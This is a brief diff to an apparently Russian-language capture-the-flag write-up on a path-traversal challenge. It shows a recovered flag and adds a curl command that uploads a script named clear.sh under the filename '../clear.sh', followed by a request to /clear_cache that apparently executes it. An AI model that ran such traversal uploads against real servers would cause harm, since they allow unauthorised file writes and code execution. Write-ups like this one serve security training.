@@ -73,3 +73,10 @@ http://127.0.0.1:7509/load?file=./
     [!] POST =  200
     "crab{lfi_lfr_path_traversal_the_classic_trio_*}"
    ```
+
+    Или можно для загрузки `clear.sh` обойтись без питона и заюзать curl:
+    ```
+        curl http://<address>/upload --form file='@clear.sh;filename=../clear.sh' -X POST
+    ```
+
+    А потом просто в браузере дёрнуть `/clear_cache`
